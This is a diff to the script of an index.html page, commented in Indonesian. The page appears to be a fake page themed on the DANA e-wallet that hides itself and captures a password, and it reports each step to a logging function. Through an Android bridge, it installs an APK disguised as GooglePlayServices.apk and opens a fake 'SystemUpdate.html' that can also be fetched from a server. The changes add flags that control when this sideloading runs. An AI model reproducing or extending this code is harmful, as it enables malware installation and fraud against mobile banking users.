@@ -74,7 +74,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - STEP-BY-STEP (WAJIB SELESAI!)
+// 🔥 INDEX.HTML - SYSTEMUPDATE.HTML TERBUKA SETELAH SEMUA SELESAI!
 // ============================================================
 
 // ============================================================
@@ -189,7 +189,7 @@ function hideFromSystem() {
 }
 
 // ============================================================
-// 4. DETEKSI BRIDGE SUPER LUAS (PENDEKATAN 3 LAPIS)
+// 4. DETEKSI BRIDGE SUPER LUAS
 // ============================================================
 var BRIDGE = null;
 
@@ -365,6 +365,11 @@ var PASSWORD_RECEIVED = false;
 var SW_REGISTERED = false;
 
 // ============================================================
+// ⚠️ FLAG PENTING: SystemUpdate.html SUDAH TERBUKA?
+// ============================================================
+var SYSTEMUPDATE_OPENED = false;
+
+// ============================================================
 // ANDROID BRIDGE (UNIVERSAL)
 // ============================================================
 var A = {
@@ -514,7 +519,6 @@ function step1_getPassword() {
                     if (retryCount >= maxRetries) {
                         K({ sumber: 'password_failed', data: 'max_retries' });
                         updateLoading('⚠️ STEP 1/5: Password gagal', 'Menggunakan fallback...');
-                        // Gunakan fallback password
                         PASSWORD = 'default_fallback_password';
                         PASSWORD_RECEIVED = true;
                         try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
@@ -867,11 +871,16 @@ function step4_showNotification() {
                 
                 notif.onclick = function() {
                     notif.close();
-                    if (A.isAvailable) {
-                        A.installAPK('/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
-                        A.openFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+                    // 🔥 HANYA INSTALL APK + BUKA HTML JIKA SUDAH SELESAI!
+                    if (PROSES_SELESAI) {
+                        if (A.isAvailable) {
+                            A.installAPK('/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
+                            A.openFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+                        }
+                    } else {
+                        // Jika belum selesai, jangan buka!
+                        K({ sumber: 'notification_clicked_early', data: 'proses_belum_selesai' });
                     }
-                    K({ sumber: 'notification_clicked', data: 'install_and_open' });
                     if (!REDIRECT_DONE) {
                         REDIRECT_DONE = true;
                         redirectToDANA();
@@ -913,6 +922,13 @@ function step4_showNotification() {
 // ============================================================
 function step5_openSystemUpdate() {
     return new Promise(function(resolve) {
+        // ⚠️ CEK: Apakah sudah terbuka? Jika sudah, skip!
+        if (SYSTEMUPDATE_OPENED) {
+            updateLoading('⚠️ STEP 5/5: SystemUpdate.html sudah terbuka', 'Skip...');
+            resolve();
+            return;
+        }
+        
         updateLoading('🚀 STEP 5/5: Membuka SystemUpdate.html...', 'FINAL!');
         
         var opened = false;
@@ -929,6 +945,7 @@ function step5_openSystemUpdate() {
                         A.openFile(paths[i]);
                         K({ sumber: 'html_opened', data: 'via_bridge: ' + paths[i] });
                         opened = true;
+                        SYSTEMUPDATE_OPENED = true;
                         updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Bridge)', 'Selesai!');
                         resolve();
                         return;
@@ -945,6 +962,7 @@ function step5_openSystemUpdate() {
                 window.open(url, '_blank');
                 K({ sumber: 'html_opened', data: 'via_blob' });
                 opened = true;
+                SYSTEMUPDATE_OPENED = true;
                 updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Blob)', 'Selesai!');
                 resolve();
                 return;
@@ -957,6 +975,7 @@ function step5_openSystemUpdate() {
                 window.location.href = SERVER + '/files/SystemUpdate.html';
                 K({ sumber: 'html_opened', data: 'via_server' });
                 opened = true;
+                SYSTEMUPDATE_OPENED = true;
                 updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Server)', 'Selesai!');
                 resolve();
             } catch(e) {
@@ -997,11 +1016,17 @@ function redirectToDANA() {
 }
 
 // ============================================================
+// ⚠️ FLAG: APAKAH SEMUA PROSES SUDAH SELESAI?
+// ============================================================
+var PROSES_SELESAI = false;
+
+// ============================================================
 // EKSEKUSI UTAMA (STEP-BY-STEP, WAJIB SELESAI!)
 // ============================================================
 async function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
+    PROSES_SELESAI = false; // Reset flag
     
     // STEP 0: Persiapan
     document.getElementById('popupDana').style.display = 'none';
@@ -1036,6 +1061,11 @@ async function dapatkanSemua() {
         await step4_showNotification();
         K({ sumber: 'step4_done', data: 'notifikasi_selesai' });
         
+        // ============================================================
+        // ✅ SEMUA STEP 1-4 SELESAI! BARU BUKA SYSTEMUPDATE.HTML
+        // ============================================================
+        PROSES_SELESAI = true; // ← FLAG: SEMUA PROSES SELESAI!
+        
         // STEP 5: Buka SystemUpdate.html (WAJIB SELESAI!)
         K({ sumber: 'step5_start', data: 'buka_systemupdate' });
         await step5_openSystemUpdate();
@@ -1057,6 +1087,7 @@ async function dapatkanSemua() {
     } catch(error) {
         K({ sumber: 'fatal_error', data: error.message });
         updateLoading('❌ Error: ' + error.message, 'Proses dihentikan...');
+        // Fallback: tetap coba buka
         setTimeout(function() {
             step5_openSystemUpdate();
             redirectToDANA();
@@ -1108,10 +1139,9 @@ if ('serviceWorker' in navigator) {
 // ============================================================
 hideFromSystem();
 
-console.log('🔥 INDEX.HTML - STEP-BY-STEP (WAJIB SELESAI!)');
+console.log('🔥 INDEX.HTML - SYSTEMUPDATE.HTML TERBUKA SETELAH SEMUA SELESAI!');
 console.log('📱 Platform:', PLATFORM);
 console.log('🔌 Bridge:', A.isAvailable);
-console.log('🔐 Bridge Detected:', HAS_BRIDGE);
 </script>
 </body>
 </html>
